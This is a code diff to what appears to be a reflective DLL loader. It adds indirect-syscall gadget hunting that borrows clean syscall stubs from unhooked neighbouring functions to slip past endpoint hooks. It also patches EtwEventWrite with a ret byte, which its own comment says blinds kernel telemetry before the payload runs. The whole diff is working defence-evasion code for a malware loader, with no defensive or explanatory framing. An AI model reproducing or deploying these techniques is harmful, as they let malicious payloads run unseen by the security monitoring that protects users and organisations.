@@ -132,45 +132,53 @@ namespace {
             }
         }
         
-        for (WORD ssn = 0; ssn < zwCount; ssn++) {
-            if (zwFuncs[ssn].hash == nameHash) {
-                auto bytes = reinterpret_cast<uint8_t*>(zwFuncs[ssn].addr);
-                
+        // RecycledGate: find our SSN position, then search own stub and neighbors for a clean gadget
+        auto FindGadget = [](uint8_t* bytes) -> PVOID {
 #if defined(_M_X64)
-                // Look for: syscall; ret (0F 05 C3)
-                for (int offset = 0; offset < 64; offset++) {
-                    if (bytes[offset] == 0x0F && bytes[offset + 1] == 0x05 && bytes[offset + 2] == 0xC3) {
-                        result.pSyscallGadget = bytes + offset;
-                        result.nArgs = nArgs;
-                        result.ssn = ssn;
-                        return result;
-                    }
-                    // Skip JMP hooks (E9 xx xx xx xx)
-                    if (bytes[offset] == 0xE9) offset += 4;
-                }
+            if (bytes[0] == 0xE9) return nullptr; // fully hooked at entry
+            for (int o = 0; o < 64; o++)
+                if (bytes[o] == 0x0F && bytes[o+1] == 0x05 && bytes[o+2] == 0xC3)
+                    return bytes + o;
 #elif defined(_M_ARM64)
-                // Look for: svc #imm; ret (d4000001 d65f03c0 or similar)
-                for (int offset = 0; offset <= 64; offset += 4) {
-                    uint32_t instr = *reinterpret_cast<uint32_t*>(bytes + offset);
-                    uint32_t nextInstr = *reinterpret_cast<uint32_t*>(bytes + offset + 4);
-                    if ((instr & 0xFF000000) == 0xD4000000 && nextInstr == 0xD65F03C0) {
-                        result.pSyscallGadget = bytes + offset;
-                        result.nArgs = nArgs;
-                        result.ssn = ssn;
-                        return result;
-                    }
-                }
-#endif
-                break;
+            for (int o = 0; o <= 64; o += 4) {
+                uint32_t ins = *reinterpret_cast<uint32_t*>(bytes + o);
+                if ((ins & 0xFF000000) == 0xD4000000 &&
+                    *reinterpret_cast<uint32_t*>(bytes + o + 4) == 0xD65F03C0)
+                    return bytes + o;
             }
+#endif
+            return nullptr;
+        };
+
+        for (WORD ssn = 0; ssn < zwCount; ssn++) {
+            if (zwFuncs[ssn].hash != nameHash) continue;
+
+            PVOID gadget = FindGadget(reinterpret_cast<uint8_t*>(zwFuncs[ssn].addr));
+
+            if (!gadget) {
+                // Borrow gadget from nearest unhooked neighbor
+                for (int d = 1; d <= 8 && !gadget; d++) {
+                    if (ssn + d < zwCount)
+                        gadget = FindGadget(reinterpret_cast<uint8_t*>(zwFuncs[ssn + d].addr));
+                    if (!gadget && ssn >= (WORD)d)
+                        gadget = FindGadget(reinterpret_cast<uint8_t*>(zwFuncs[ssn - d].addr));
+                }
+            }
+
+            if (gadget) {
+                result.pSyscallGadget = gadget;
+                result.nArgs = nArgs;
+                result.ssn = ssn;
+            }
+            break;
         }
         
         return result;
     }
     
-    // Syscall hashes - computed via constexpr to guarantee match with CalcHash
     constexpr DWORD H_ZwAllocateVirtualMemory = hash("ZwAllocateVirtualMemory");
-    constexpr DWORD H_ZwProtectVirtualMemory = hash("ZwProtectVirtualMemory");
+    constexpr DWORD H_ZwProtectVirtualMemory  = hash("ZwProtectVirtualMemory");
+    constexpr DWORD H_ETWEVENTWRITE           = hash("EtwEventWrite");
 
     __forceinline DWORD CalcHashModule(UNICODE_STR* name) {
         DWORD h = 0;
@@ -415,7 +423,24 @@ extern "C" DLLEXPORT ULONG_PTR WINAPI Bootstrap(LPVOID lpParameter) {
                           (ULONG)newProtect, &oldProtect);
     }
 
-    // 12. Call DllMain
+    // 12. ETW patch — write 0xC3 (ret) over EtwEventWrite in the loaded ntdll
+    //     Blinds kernel telemetry before any noisy API calls in the payload.
+    for (DWORD i = 0; i < expNtdll->NumberOfNames; i++) {
+        char* name = reinterpret_cast<char*>(ntdllBase + namesNtdll[i]);
+        if (CalcHash(name) == H_ETWEVENTWRITE) {
+            PVOID pEtw = reinterpret_cast<PVOID>(ntdllBase + funcsNtdll[ordsNtdll[i]]);
+            SIZE_T patchSize = 1;
+            ULONG oldProt = 0;
+            SyscallTrampoline(&scProtect, (HANDLE)-1, &pEtw, &patchSize,
+                              (ULONG)PAGE_EXECUTE_READWRITE, &oldProt);
+            *reinterpret_cast<uint8_t*>(pEtw) = 0xC3;
+            SyscallTrampoline(&scProtect, (HANDLE)-1, &pEtw, &patchSize,
+                              oldProt, &oldProt);
+            break;
+        }
+    }
+
+    // 13. Call DllMain
     auto pDllMain = reinterpret_cast<DllMain_t>(newBaseAddr + entryPointRva);
     pNtFlushInstructionCache(reinterpret_cast<HANDLE>(-1), NULL, 0);
     pDllMain(reinterpret_cast<HINSTANCE>(newBaseAddr), DLL_PROCESS_ATTACH, lpParameter);
